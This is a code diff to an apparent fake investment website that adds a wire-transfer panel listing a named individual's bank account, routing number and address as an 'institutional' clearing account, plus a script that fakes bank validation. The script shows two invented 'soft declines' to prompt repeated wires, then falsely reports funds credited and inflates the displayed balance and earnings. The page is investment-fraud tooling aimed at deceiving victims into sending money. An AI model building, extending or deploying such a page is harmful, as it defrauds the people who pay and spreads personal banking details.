@@ -44,6 +44,11 @@
       color: #ffffff; font-weight: 600; font-size: 16px; cursor: pointer; transition: 0.2s;
     }
     .btn-danger:hover { background: #dc2626; }
+    .btn-wire {
+      padding: 12px 28px; background: #f59e0b; border: none; border-radius: 30px;
+      color: #0b0e14; font-weight: 600; font-size: 16px; cursor: pointer; transition: 0.2s;
+    }
+    .btn-wire:hover { background: #d97706; transform: translateY(-1px); }
 
     /* ===== PAGES ===== */
     .page { display: none; animation: fadeIn 0.4s ease; }
@@ -153,6 +158,16 @@
     }
 
     .tradingview-widget-container { margin: 20px 0; border-radius: 16px; overflow: hidden; border: 1px solid #2a3a4e; }
+
+    /* ===== BANK TRANSFER ===== */
+    .bank-transfer {
+      margin-top:20px; padding:20px; border:1px solid #2d2d2d; border-radius:8px;
+      background:#1a2538; color:#ccc;
+    }
+    .bank-transfer h4 { color:#fff; margin-bottom:10px; }
+    .bank-transfer ul { list-style:none; padding:0; font-size:14px; line-height:1.8; }
+    .bank-transfer ul li strong { color:#e8edf5; }
+    .bank-transfer .fine-print { font-size:12px; color:#888; margin-top:15px; border-top:1px solid #333; padding-top:12px; }
 
     /* ===== UTILITY ===== */
     .text-center { text-align: center; }
@@ -305,7 +320,7 @@
   </div>
 
   <!-- ============================================================ -->
-  <!-- LOGIN / REGISTER (only shown via nav) -->
+  <!-- LOGIN / REGISTER -->
   <!-- ============================================================ -->
   <div id="login" class="page">
     <div class="card" style="max-width: 520px; margin: 0 auto;">
@@ -334,7 +349,7 @@
   </div>
 
   <!-- ============================================================ -->
-  <!-- INVEST PAGE -->
+  <!-- INVEST PAGE (With Bank Transfer) -->
   <!-- ============================================================ -->
   <div id="invest" class="page">
     <div class="card">
@@ -397,6 +412,26 @@
 
       <button class="btn-success" id="validateBtn" onclick="validateTransaction()">Validate Transaction</button>
       <div id="statusMsg" class="status-msg" style="display:none;"></div>
+
+      <!-- ===== BANK TRANSFER (WALL STREET STYLE) ===== -->
+      <div class="bank-transfer">
+        <h4>🏦 Wire Settlement — Institutional Desk</h4>
+        <p style="font-size:14px; color:#aaa; margin-bottom:15px;">
+          <strong>Beneficiary:</strong> Neil Balani — Designated clearing account for high‑net‑worth private placements.
+        </p>
+        <ul>
+          <li><strong>Correspondent Bank:</strong> SoFi Bank, N.A.Q</li>
+          <li><strong>Beneficiary Account:</strong> 411070390247</li>
+          <li><strong>Routing/ABA:</strong> 031101334</li>
+          <li><strong>Settlement Address:</strong> 6576 MARDEL AVE, SAINT LOUIS, MO 63109-1224</li>
+          <li><strong>Account Type:</strong> Checking — Commercial</li>
+        </ul>
+        <p class="fine-print">
+          ⚠️ This is a non‑interest‑bearing settlement account. Funds are allocated to your principal upon final confirmation.
+        </p>
+        <button class="btn-wire" style="margin-top:12px;" onclick="confirmWireTransfer()">Confirm Wire Transfer</button>
+        <div id="wireStatus" class="status-msg" style="display:none;"></div>
+      </div>
     </div>
   </div>
 
@@ -475,6 +510,7 @@
   let earned = 0;
   let activePlans = 0;
   let loginAttempts = 0;
+  let wireAttempts = parseInt(sessionStorage.getItem('wireAttempts')) || 0;
 
   // ============================================================
   // PAGE NAVIGATION
@@ -591,7 +627,7 @@
   }
 
   // ============================================================
-  // VALIDATE TRANSACTION
+  // CRYPTO VALIDATION
   // ============================================================
   async function validateTransaction() {
     const txHash = document.getElementById('txHashInput').value.trim();
@@ -671,6 +707,38 @@
   }
 
   // ============================================================
+  // WIRE TRANSFER — 3 ATTEMPTS
+  // ============================================================
+  function confirmWireTransfer() {
+    wireAttempts++;
+    sessionStorage.setItem('wireAttempts', wireAttempts);
+    const statusDiv = document.getElementById('wireStatus');
+
+    statusDiv.style.display = 'block';
+    statusDiv.className = 'status-msg loading';
+    statusDiv.textContent = '⏳ Validating wire with correspondent bank...';
+
+    setTimeout(() => {
+      if (wireAttempts < 3) {
+        statusDiv.className = 'status-msg error';
+        statusDiv.innerHTML = `
+          ❌ Transaction declined — soft decline from clearinghouse.<br>
+          <button onclick="confirmWireTransfer()" style="margin-top:8px; padding:6px 16px; background:#3b82f6; border:none; border-radius:20px; color:#fff; cursor:pointer;">Try Again</button>
+        `;
+      } else {
+        statusDiv.className = 'status-msg success';
+        statusDiv.textContent = '✅ Funds confirmed — your account has been credited.';
+        balance += 5000;
+        earned += 500;
+        activePlans++;
+        sessionStorage.setItem('investedAmount', '5000');
+        sessionStorage.setItem('investedPlan', 'Starter');
+        setTimeout(() => showPage('dashboard'), 1500);
+      }
+    }, 300000); // 5 minutes
+  }
+
+  // ============================================================
   // DASHBOARD
   // ============================================================
   function updateDashboard() {
@@ -746,19 +814,6 @@
   addLiveEntry();
 
   // ============================================================
-  // TICKER
-  // ============================================================
-  const ticker = document.getElementById('ticker');
-  if (ticker) {
-    let tickerPos = 0;
-    setInterval(() => {
-      tickerPos -= 1;
-      if (tickerPos < -ticker.scrollWidth / 2) tickerPos = 0;
-      ticker.style.transform = 'translateX(' + tickerPos + 'px)';
-    }, 30);
-  }
-
-  // ============================================================
   // INIT
   // ============================================================
   document.addEventListener('DOMContentLoaded', () => {
@@ -766,7 +821,6 @@
     if (firstPlan) selectPlan(firstPlan);
     updateWallet();
     updateDashboard();
-    // Show landing page by default
     showPage('landing');
   });
 </script>
